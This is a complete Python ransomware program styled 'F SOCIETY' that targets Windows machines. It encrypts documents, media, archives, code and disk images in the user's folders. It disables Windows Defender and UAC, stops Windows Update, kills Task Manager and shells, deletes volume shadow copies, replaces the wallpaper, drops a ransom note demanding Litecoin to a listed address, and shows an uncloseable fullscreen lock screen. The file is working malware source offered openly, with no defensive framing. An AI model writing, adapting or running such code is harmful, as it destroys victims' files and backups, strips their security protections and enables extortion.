import os
import base64
import ctypes
import subprocess
import sys
import time
import shutil
import re
import tkinter as tk
from tkinter import messagebox, scrolledtext
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import winreg

# --- Configuration ---
LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
RANSOM_AMOUNT = "$250 USD in Litecoin"
DECRYPT_KEY = "agent77"

# --- Core Encryption Functions ---
def generate_key():
    return get_random_bytes(32)

def generate_iv():
    return get_random_bytes(16)

def encrypt_file(file_path, key, iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path, 'wb') as f:
            f.write(iv + encrypted_data)
        return True
    except:
        return False

def decrypt_file(file_path, key, iv):
    try:
        with open(file_path, 'rb') as f:
            iv_data = f.read(16)
            encrypted_data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv_data)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        original_path = file_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(file_path)
        return True
    except:
        return False

def encrypt_directory(directory, key, iv, extensions=None):
    if extensions is None:
        extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
            '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd',
            '.mp3', '.wav', '.flac', '.aac', '.ogg',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
            '.exe', '.dll', '.msi', '.apk', '.app', '.deb', '.rpm',
            '.php', '.html', '.htm', '.css', '.js', '.py', '.cpp', '.c',
            '.java', '.class', '.jar', '.sql', '.db', '.mdb', '.accdb',
            '.ps1', '.bat', '.cmd', '.sh', '.bash',
            '.ai', '.eps', '.svg', '.indd', '.cdr', '.dxf', '.dwg',
            '.iso', '.img', '.vhd', '.vmdk', '.ova', '.ovf',
            '.pst', '.ost', '.msg', '.eml', '.mdb', '.nsf'
        ]
    
    count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            ext = os.path.splitext(file)[1].lower()
            if ext in extensions and not file.endswith('.encrypted'):
                if encrypt_file(file_path, key, iv):
                    count += 1
                try:
                    os.rename(file_path, file_path + '.encrypted')
                except:
                    pass
    return count

def decrypt_all_files(key, iv):
    count = 0
    for directory in get_target_directories():
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    if decrypt_file(file_path, key, iv):
                        count += 1
    return count

def get_target_directories():
    user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
    paths = [
        user_profile + '\\Desktop',
        user_profile + '\\Documents',
        user_profile + '\\Downloads',
        user_profile + '\\Pictures',
        user_profile + '\\Music',
        user_profile + '\\Videos',
        user_profile + '\\AppData\\Local',
        user_profile + '\\AppData\\Roaming',
        user_profile + '\\Favorites',
        user_profile + '\\OneDrive',
        'C:\\ProgramData',
        'C:\\Users\\Public\\Documents',
        'C:\\Users\\Public\\Desktop'
    ]
    return [p for p in paths if os.path.exists(p)]

# --- System Manipulation ---
def disable_security():
    try:
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableArchiveScanning $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True)
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(handle)
        except:
            pass
        subprocess.run('net stop wuauserv', shell=True, capture_output=True)
        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True)
        subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True)
        subprocess.run('taskkill /f /im regedit.exe 2>nul', shell=True)
        subprocess.run('taskkill /f /im cmd.exe 2>nul', shell=True)
        subprocess.run('taskkill /f /im powershell.exe 2>nul', shell=True)
    except:
        pass

def delete_shadow_copies():
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True)
        subprocess.run('wmic shadowcopy delete', shell=True, capture_output=True)
    except:
        pass

def change_wallpaper():
    try:
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (1920, 1080), color='black')
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("arial.ttf", 72)
            font2 = ImageFont.truetype("arial.ttf", 48)
            font3 = ImageFont.truetype("arial.ttf", 30)
        except:
            font = ImageFont.load_default()
            font2 = ImageFont.load_default()
            font3 = ImageFont.load_default()
        text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
        draw.text((100, 300), text, fill=(255, 0, 0), font=font)
        draw.text((100, 550), f"Pay {RANSOM_AMOUNT} in Litecoin", fill=(255, 255, 255), font=font2)
        draw.text((100, 650), LTC_ADDRESS, fill=(0, 255, 0), font=font3)
        draw.text((100, 750), "To decrypt, run the program and enter the key.", fill=(255, 255, 0), font=font3)
        wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
        img.save(wallpaper_path)
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Control Panel\Desktop"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "Wallpaper", 0, winreg.REG_SZ, wallpaper_path)
        winreg.SetValueEx(handle, "WallpaperStyle", 0, winreg.REG_SZ, "2")
        winreg.SetValueEx(handle, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(handle)
    except:
        pass

def create_ransom_note(key_hex, iv_hex):
    note = f"""
=============================================================
          F SOCIETY RANSOMWARE - AES-256 ENCRYPTION
=============================================================

Your files have been encrypted with AES-256-CBC.

To recover your files, pay {RANSOM_AMOUNT} in Litecoin to:

Litecoin Address: {LTC_ADDRESS}

IMPORTANT:
- You have 72 hours to pay
- After 72 hours, the key will be destroyed

DECRYPTION KEY (DO NOT LOSE):
Key: {key_hex}
IV:  {iv_hex}

TO DECRYPT:
Run this program and enter the decryption key.

=============================================================
            F SOCIETY - WE ARE EVERYWHERE
=============================================================
"""
    desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
    with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
        f.write(note)

# --- Full-Screen Decryption UI ---
class RansomwareUI:
    def __init__(self, root):
        self.root = root
        self.root.title("F SOCIETY RANSOMWARE")
        self.root.attributes('-fullscreen', True)  # Full screen
        self.root.attributes('-topmost', True)     # Always on top
        self.root.configure(bg='black')
        
        # Prevent closing with Alt+F4
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Disable full-screen exit (F11)
        self.root.bind("<F11>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        
        # UI Elements
        self.create_widgets()
    
    def create_widgets(self):
        # Title
        title = tk.Label(self.root, text="F SOCIETY RANSOMWARE", 
                         font=('Arial', 48, 'bold'), fg='red', bg='black')
        title.pack(pady=20)
        
        # Subtitle
        sub = tk.Label(self.root, text="YOUR FILES HAVE BEEN ENCRYPTED", 
                       font=('Arial', 24), fg='white', bg='black')
        sub.pack(pady=10)
        
        # Info text
        info = f"""
        Your files are encrypted with AES-256-CBC.
        
        To decrypt your files, you must enter the decryption key.
        
        Litecoin Address: {LTC_ADDRESS}
        Amount: {RANSOM_AMOUNT}
        
        You have 72 hours to pay. After that, the key will be destroyed.
        """
        info_label = tk.Label(self.root, text=info, font=('Arial', 16), 
                              fg='white', bg='black', justify='left')
        info_label.pack(pady=20)
        
        # Key entry
        key_frame = tk.Frame(self.root, bg='black')
        key_frame.pack(pady=10)
        
        tk.Label(key_frame, text="Enter Decryption Key:", 
                 font=('Arial', 20), fg='white', bg='black').pack(side=tk.LEFT, padx=10)
        
        self.key_entry = tk.Entry(key_frame, font=('Arial', 20), width=30, 
                                  show='*', bg='white', fg='black')
        self.key_entry.pack(side=tk.LEFT, padx=10)
        self.key_entry.focus()
        
        # Buttons
        button_frame = tk.Frame(self.root, bg='black')
        button_frame.pack(pady=20)
        
        decrypt_btn = tk.Button(button_frame, text="DECRYPT FILES", 
                                font=('Arial', 18, 'bold'), bg='red', fg='white',
                                command=self.decrypt_action, padx=20, pady=10)
        decrypt_btn.pack(side=tk.LEFT, padx=20)
        
        # Status display
        self.status_text = scrolledtext.ScrolledText(self.root, height=10, 
                                                     font=('Arial', 12), bg='black', fg='#00ff00')
        self.status_text.pack(pady=20, padx=50, fill=tk.BOTH, expand=True)
        self.status_text.insert(tk.END, "[+] Ready for decryption.\n")
        self.status_text.see(tk.END)
        self.status_text.config(state='disabled')
    
    def update_status(self, message):
        self.status_text.config(state='normal')
        self.status_text.insert(tk.END, message + "\n")
        self.status_text.see(tk.END)
        self.status_text.config(state='disabled')
    
    def decrypt_action(self):
        key_input = self.key_entry.get().strip()
        
        if not key_input:
            messagebox.showerror("Error", "Please enter the decryption key.")
            return
        
        if key_input != DECRYPT_KEY:
            messagebox.showerror("Invalid Key", "The decryption key is incorrect.")
            self.update_status("[-] Invalid decryption key entered.")
            return
        
        self.update_status("[+] Decryption key accepted. Starting decryption...")
        self.root.update()
        
        try:
            # Read key/iv from ransom note
            desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
            note_path = desktop + '\\README_FSOCIETY.txt'
            
            if not os.path.exists(note_path):
                self.update_status("[-] Ransom note not found. Cannot decrypt.")
                return
            
            with open(note_path, 'r') as f:
                content = f.read()
                key_match = re.search(r'Key: (\S+)', content)
                iv_match = re.search(r'IV: (\S+)', content)
                
                if not key_match or not iv_match:
                    self.update_status("[-] Could not find encryption key in note.")
                    return
                
                key = base64.b64decode(key_match.group(1))
                iv = base64.b64decode(iv_match.group(1))
            
            self.update_status("[+] Key and IV extracted. Decrypting files...")
            
            # Decrypt all files
            count = decrypt_all_files(key, iv)
            self.update_status(f"[+] Decryption complete! {count} files restored.")
            
            # Remove ransom note
            try:
                os.remove(note_path)
                self.update_status("[+] Ransom note removed.")
            except:
                pass
            
            # Change wallpaper back
            try:
                ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
                self.update_status("[+] Wallpaper restored.")
            except:
                pass
            
            # Show success message
            messagebox.showinfo("Success", f"Decryption complete!\n{count} files restored.")
            self.update_status("[+] You can now close this window.")
            
        except Exception as e:
            self.update_status(f"[-] Decryption error: {str(e)}")
            messagebox.showerror("Error", f"Decryption failed: {str(e)}")

def run_ui():
    root = tk.Tk()
    app = RansomwareUI(root)
    root.mainloop()

# --- Main Entry Point ---
def main():
    # Check if running in encryption mode (no args or --encrypt)
    if len(sys.argv) == 1 or (len(sys.argv) >= 2 and sys.argv[1] == '--encrypt'):
        # Perform encryption
        try:
            key = generate_key()
            iv = generate_iv()
            key_hex = base64.b64encode(key).decode()
            iv_hex = base64.b64encode(iv).decode()
            
            disable_security()
            delete_shadow_copies()
            change_wallpaper()
            
            total = 0
            for directory in get_target_directories():
                try:
                    count = encrypt_directory(directory, key, iv)
                    total += count
                except:
                    pass
            
            create_ransom_note(key_hex, iv_hex)
            
            # Launch UI for decryption
            run_ui()
            
        except Exception as e:
            print(f"[-] Encryption error: {e}")
            time.sleep(5)
    
    else:
        # If any arguments, just run UI (for decryption)
        run_ui()

if __name__ == "__main__":
    main()
